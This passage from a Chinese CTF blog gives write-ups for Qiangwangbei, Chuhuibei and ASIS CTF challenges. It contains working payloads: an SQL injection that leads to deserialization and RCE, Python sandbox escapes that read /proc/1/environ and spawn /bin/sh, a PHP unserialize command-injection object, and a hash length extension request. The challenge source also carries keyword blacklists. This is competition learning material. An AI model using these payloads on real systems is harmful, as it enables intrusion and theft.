&#x27;on_sale_time&#x27;: &#x27;2023-12-16T21:20&#x27;,</span><br><span class="line">    &#x27;image&#x27;: &#x27;$sql&#x27;,</span><br><span class="line">    f&quot;data`=&#x27;&#123;exp&#125;&#x27;/**/WHERE/**/`id`/**/=/**/1;#&quot;: &#x27;123&#x27;,</span><br><span class="line">    &#x27;data&#x27;: &#x27;1&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, cookies=cookies, data=data)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>最后访问页面，触发反序列化</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218235942528-1707064057755-9.png" alt="image-20231218235942528"></p>
+<p>本地打一下，看见打上去了</p>
+<p>直接RCE</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231219000032765-1707064057755-10.png" alt="image-20231219000032765"></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Pyjail-It’s-myFILTER"><a href="#Pyjail-It’s-myFILTER" class="headerlink" title="Pyjail ! It’s myFILTER !!!"></a>Pyjail ! It’s myFILTER !!!</h3><p>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># Python Version:python3.10</span><br><span class="line"># Source Code:</span><br><span class="line"></span><br><span class="line">import code, os, subprocess</span><br><span class="line">import pty</span><br><span class="line">def blacklist_fun_callback(*args):</span><br><span class="line">    print(&quot;Player! It&#x27;s already banned!&quot;)</span><br><span class="line"></span><br><span class="line">pty.spawn = blacklist_fun_callback</span><br><span class="line">os.system = blacklist_fun_callback</span><br><span class="line">os.popen = blacklist_fun_callback</span><br><span class="line">subprocess.Popen = blacklist_fun_callback</span><br><span class="line">subprocess.call = blacklist_fun_callback</span><br><span class="line">code.interact = blacklist_fun_callback</span><br><span class="line">code.compile_command = blacklist_fun_callback</span><br><span class="line"></span><br><span class="line">vars = blacklist_fun_callback</span><br><span class="line">attr = blacklist_fun_callback</span><br><span class="line">dir = blacklist_fun_callback</span><br><span class="line">getattr = blacklist_fun_callback</span><br><span class="line">exec = blacklist_fun_callback</span><br><span class="line">__import__ = blacklist_fun_callback</span><br><span class="line">compile = blacklist_fun_callback</span><br><span class="line">breakpoint = blacklist_fun_callback</span><br><span class="line"></span><br><span class="line">del os, subprocess, code, pty, blacklist_fun_callback</span><br><span class="line">input_code = input(&quot;Can u input your code to escape &gt; &quot;)</span><br><span class="line"></span><br><span class="line">blacklist_words = [</span><br><span class="line">    &quot;subprocess&quot;,</span><br><span class="line">    &quot;os&quot;,</span><br><span class="line">    &quot;code&quot;,</span><br><span class="line">    &quot;interact&quot;,</span><br><span class="line">    &quot;pty&quot;,</span><br><span class="line">    &quot;pdb&quot;,</span><br><span class="line">    &quot;platform&quot;,</span><br><span class="line">    &quot;importlib&quot;,</span><br><span class="line">    &quot;timeit&quot;,</span><br><span class="line">    &quot;imp&quot;, </span><br><span class="line">    &quot;commands&quot;,</span><br><span class="line">    &quot;popen&quot;,</span><br><span class="line">    &quot;load_module&quot;,</span><br><span class="line">    &quot;spawn&quot;,</span><br><span class="line">    &quot;system&quot;,</span><br><span class="line">    &quot;/bin/sh&quot;,</span><br><span class="line">    &quot;/bin/bash&quot;,</span><br><span class="line">    &quot;flag&quot;,</span><br><span class="line">    &quot;eval&quot;,</span><br><span class="line">    &quot;exec&quot;,</span><br><span class="line">    &quot;compile&quot;,</span><br><span class="line">    &quot;input&quot;,</span><br><span class="line">    &quot;vars&quot;,</span><br><span class="line">    &quot;attr&quot;,</span><br><span class="line">    &quot;dir&quot;,</span><br><span class="line">    &quot;getattr&quot;</span><br><span class="line">    &quot;__import__&quot;,</span><br><span class="line">    &quot;__builtins__&quot;,</span><br><span class="line">    &quot;__getattribute__&quot;,</span><br><span class="line">    &quot;__class__&quot;,</span><br><span class="line">    &quot;__base__&quot;,</span><br><span class="line">    &quot;__subclasses__&quot;,</span><br><span class="line">    &quot;__getitem__&quot;,</span><br><span class="line">    &quot;__self__&quot;,</span><br><span class="line">    &quot;__globals__&quot;,</span><br><span class="line">    &quot;__init__&quot;,</span><br><span class="line">    &quot;__name__&quot;,</span><br><span class="line">    &quot;__dict__&quot;,</span><br><span class="line">    &quot;._module&quot;,</span><br><span class="line">    &quot;builtins&quot;,</span><br><span class="line">    &quot;breakpoint&quot;,</span><br><span class="line">    &quot;import&quot;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def my_filter(input_code):</span><br><span class="line">    for x in blacklist_words:</span><br><span class="line">        if x in input_code:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">while &#x27;&#123;&#x27; in input_code and &#x27;&#125;&#x27; in input_code and input_code.isascii() and my_filter(input_code) and &quot;eval&quot; not in input_code and len(input_code) &lt; 65:</span><br><span class="line">    input_code = eval(f&quot;f&#x27;&#123;input_code&#125;&#x27;&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;Player! Please obey the filter rules which I set!&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>直接打</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;&#125;&#x27; + print(open(&#x27;/proc/1/environ&#x27;).read()) #</span><br></pre></td></tr></table></figure>
+
+<h3 id="Pyjail-It’s-myRevenge"><a href="#Pyjail-It’s-myRevenge" class="headerlink" title="Pyjail ! It’s myRevenge !!!"></a>Pyjail ! It’s myRevenge !!!</h3><p>题目源码</p>
+<p>第一步清除 blacklist，然后用 input 读入继续打</p>
+<table>
+<thead>
+<tr>
+<th><code>1 2 3 </code></th>
+<th><code>&#123;[list(globals().values())[-2].clear(),&quot;&#123;i&quot;&quot;nput()&#125;&quot;][1]&#125; &#123;[globals()[&quot;__builtins__&quot;].exec(&quot;import os&quot;),&quot;&#123;i&quot;&quot;nput()&#125;&quot;][1]&#125; &#123;[os.spawnv(0, &quot;/bin/sh&quot;, [&quot;sh&quot;]),&quot;&#123;i&quot;&quot;nput()&#125;&quot;][1]&#125; </code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="Pyjail-It’s-myAST"><a href="#Pyjail-It’s-myAST" class="headerlink" title="Pyjail ! It’s myAST !!!!"></a>Pyjail ! It’s myAST !!!!</h3><p>题目源码，远程环境为 python 3.11</p>
+<p>python 3.10 开始引入了 <code>match</code> 关键字，可以用 <code>match</code> 获取对象属性，用 unicode <code>﹍</code> 绕过下划线检测，用 <code>bytes</code> 转字符串和 <code>len</code> 构造数字绕过 ast 中的禁止常量，使用海象运算符绕过赋值，减小 payload 长度，虽然 1800 够用了 （</p>
+<h3 id="一-SpeedUp"><a href="#一-SpeedUp" class="headerlink" title="一.SpeedUp"></a>一.SpeedUp</h3><p><img src="/image-20231219005108031-1707064057755-11.png" alt="image-20231219005108031">在这个网站直接记载了2的27次方的阶乘的每一位数字之和</p>
+<p>A244060 - OEIS</p>
+<p><img src="/image-20231219005038815-1707064057755-12.png" alt="image-20231219005038815"></p>
+<p>对4495662081取个sha256即可 </p>
+<p>flag{bbdee5c548fddfc76617c562952a3a3b03d423985c095521a8661d248fad3797}</p>
+<h3 id="石头剪刀布"><a href="#石头剪刀布" class="headerlink" title="石头剪刀布"></a>石头剪刀布</h3><p>他是贝叶斯预测，然后手搓序列，每次贝叶斯的预测的应该差不多，可以看最后一次结果，然后序列中改成赢过AI的出法加入序列，按照这个规律改就可以把分数逐步上升，最后达到260分拿到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0 - 石头，1 - 剪刀，2 - 布</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.147.133.72&#x27;</span>,<span class="number">25458</span>)</span><br><span class="line"></span><br><span class="line">opponent_choice = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(opponent_choice)):</span><br><span class="line">    d = p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(opponent_choice[i]).encode())</span><br><span class="line">    r = p.recv()</span><br><span class="line">    score = re.findall(<span class="string">r&#x27;你的分数： (.*?)\n&#x27;</span>,d.decode())</span><br><span class="line">    <span class="keyword">if</span> score != []:</span><br><span class="line">        <span class="built_in">print</span>(score[<span class="number">0</span>]+<span class="string">&#x27;/260&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line">d = p.recv()</span><br><span class="line"><span class="built_in">print</span>(d.decode())</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r = p.recv()</span><br><span class="line"><span class="built_in">print</span>(r.decode())</span><br><span class="line">score = re.findall(<span class="string">r&#x27;你的分数： (.*?)\n&#x27;</span>,d.decode())</span><br><span class="line"><span class="keyword">if</span> score != []:</span><br><span class="line">    <span class="built_in">print</span>(score[<span class="number">0</span>]+<span class="string">&#x27;/260&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(opponent_choice))+<span class="string">&#x27;/100&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+	
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/12/25/chuhuibei/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="星河风">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/12/25/chuhuibei/" class="post-title-link" itemprop="url">楚慧杯</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-12-25 00:31:42" itemprop="dateCreated datePublished" datetime="2023-12-25T00:31:42+08:00">2023-12-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-02-05 00:34:08" itemprop="dateModified" datetime="2024-02-05T00:34:08+08:00">2024-02-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="楚慧杯"><a href="#楚慧杯" class="headerlink" title="楚慧杯"></a>楚慧杯</h1><h2 id="eaaeval"><a href="#eaaeval" class="headerlink" title="eaaeval"></a>eaaeval</h2><p>打开题目，源码给了用户密码</p>
+<p><img src="/2023/12/25/chuhuibei/image-20231219005653278-1707064335125-1.png" alt="image-20231219005653278"></p>
+<p>登陆后啥也没有，扫一下发现源码泄露<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &#x27;admin&#x27;;</span><br><span class="line">        $this-&gt;b = &#x27;admin&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if(!preg_match(&quot;/flag|system|php|cat|tac|shell|sort/i&quot;, $this-&gt;a) &amp;&amp; !preg_match(&quot;/flag|system|php|cat|tac|shell|sort/i&quot;, $this-&gt;b))&#123;</span><br><span class="line">    	system($this-&gt;a.&#x27; &#x27;.$this-&gt;b);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                echo &quot;again?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$wzbz = $_GET[&#x27;wzbz&#x27;];</span><br><span class="line">unserialize($wzbz);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$A=new Flag();</span><br><span class="line">$A-&gt;a=&#x27;ca\t&#x27;;</span><br><span class="line">$A-&gt;b=&#x27;/f*&#x27;;</span><br><span class="line">echo serialize($A);</span><br></pre></td></tr></table></figure>
+
+<p>upload_shell<br>打开题目，有个登录框，随便登录进去</p>
+<p>得到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> &lt;?php</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;./my.php&quot;;</span><br><span class="line">echo strlen($secret);</span><br><span class="line">echo&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo(md5($secret.&quot;adminpassword&quot;));</span><br><span class="line">@$username = urldecode($_POST[&quot;username&quot;]);</span><br><span class="line">@$password = urldecode($_POST[&quot;password&quot;]);</span><br><span class="line">if (!empty($_COOKIE[&quot;source&quot;])) &#123;</span><br><span class="line">    if ($username === &quot;admin&quot; &amp;&amp; $password != &quot;password&quot;) &#123;</span><br><span class="line">         if ($_COOKIE[&quot;source&quot;] === md5($secret.$username.$password)) &#123;</span><br><span class="line"></span><br><span class="line">         // 在验证用户后，如果登录成功，设置会话变量来表示用户已登录</span><br><span class="line">          $_SESSION[&#x27;loggedin&#x27;] = true;</span><br><span class="line">          $_SESSION[&#x27;username&#x27;] = &#x27;admin&#x27;; // 用户名</span><br><span class="line">          $_SESSION[&#x27;role&#x27;] = &#x27;admin&#x27;; // 用户角色或权限</span><br><span class="line">          echo &quot;&lt;script&gt;window.location.href=&#x27;upload.php&#x27;;&lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">             echo &quot;&lt;br&gt;&quot;; </span><br><span class="line">            die (&quot;你的cookie好像不太对啊&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die (&quot;可不会轻易放你进去&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">14</span><br><span class="line">879bd10c8628894d388c068a25326c21</span><br></pre></td></tr></table></figure>
+
+
+<p>分析一下发现是哈希长度拓展攻击<br>直接脚本</p>
+<p>bp抓包修改cookie</p>
+<p>username&#x3D;admin&amp;password&#x3D;password%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%d8%00%00%00%00%00%00%00ctf<br>1<br>成功跳转</p>
+<p>这里考点是文件上传注入，对文件名注入</p>
+<p>放弃灵魂直接sqlmap跑</p>
+
+      
+    </div>
+
+    
+    
+    
+	
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/12/25/ASISCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="星河风">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/12/25/ASISCTF/" class="post-title-link" itemprop="url">ASISCTF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-12-25 00:22:51" itemprop="dateCreated datePublished" datetime="2023-12-25T00:22:51+08:00">2023-12-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-02-05 00:25:27" itemprop="dateModified" datetime="2024-02-05T00:25:27+08:00">2024-02-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Pupptear"><a href="#Pupptear" class="headerlink" title="Pupptear:"></a><strong>Pupptear:</strong></h2><p>***报错追踪文件名字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Do you know what Puppeteer&#x27;s friends call him when he cries? Pupptear... hahahaah</span><br><span class="line"></span><br><span class="line">[attachment](&lt;https://asisctf.com/tasks/pupptear_0ab53ea3b73da58a4d0854bf42ec1ea166283b3e.txz&gt;)</span><br><span class="line"></span><br><span class="line">nc 18.195.96.13 2000</span><br><span class="line"></span><br><span class="line">Flag format for Pupptear: ^ASIS&#123;[^&#123;&#125;]+&#125;$</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/7865afae-5d80-486d-b9d3-9239e8b4ff5e/pupptear.txz">pupptear.txz</a></p>
+<p>oh ok</p>
+<p>I get the concept.</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="title function_">input</span>(<span class="string">&#x27;input URL (b64ed): &#x27;</span>)</span><br><span class="line"><span class="keyword">if</span>(not re.<span class="title function_">match</span>(<span class="string">&#x27;^[A-Za-z0-9=+/]+$&#x27;</span>,url)):</span><br><span class="line">	<span class="title function_">print</span>(<span class="string">&#x27;bad URL&#x27;</span>)</span><br><span class="line">	<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">os.<span class="title function_">close</span>(<span class="number">0</span>)</span><br><span class="line">os.<span class="title function_">close</span>(<span class="number">1</span>)</span><br><span class="line">os.<span class="title function_">close</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">containerName = <span class="string">&#x27;&#x27;</span>.<span class="title function_">join</span>(random.<span class="title function_">choice</span>(string.<span class="property">ascii_uppercase</span> + string.<span class="property">digits</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0x10</span>))</span><br><span class="line">os.<span class="title function_">system</span>(f<span class="string">&#x27;bash -c &quot;sleep 5 &amp;&amp; docker kill &#123;containerName&#125; 2&gt;/dev/null&quot; &amp;&#x27;</span>)</span><br><span class="line">os.<span class="title function_">system</span>(f<span class="string">&#x27;docker run --name &#123;containerName&#125; pupptear bash -c \\&#x27;</span>/<span class="variable constant_">ASIS</span>*/index.<span class="property">js</span> &#123;url&#125;\\<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">#!<span class="regexp">/usr/</span>bin/env node</span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">&#x27;flag&#123;test-flag&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">url</span>)&#123;</span><br><span class="line">	<span class="keyword">let</span> browser;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="regexp">/^https?:\\/</span>\\<span class="comment">//.test(url))&#123;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">		    <span class="attr">pipe</span>: <span class="literal">true</span>,</span><br><span class="line">		    <span class="attr">args</span>: [</span><br><span class="line">		        <span class="string">&quot;--no-sandbox&quot;</span>,</span><br><span class="line">		        <span class="string">&quot;--disable-setuid-sandbox&quot;</span>,</span><br><span class="line">		        <span class="string">&quot;--js-flags=--noexpose_wasm,--jitless&quot;</span>,</span><br><span class="line">		        <span class="string">&quot;--ignore-certificate-errors&quot;</span>,</span><br><span class="line">		    ],</span><br><span class="line">		    <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/google-chrome-stable&quot;</span>,</span><br><span class="line">		    <span class="attr">headless</span>: <span class="string">&#x27;new&#x27;</span></span><br><span class="line">		&#125;);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">let</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">		<span class="keyword">await</span> page.<span class="title function_">goto</span>(url,&#123; <span class="attr">timeout</span>: <span class="number">2000</span> 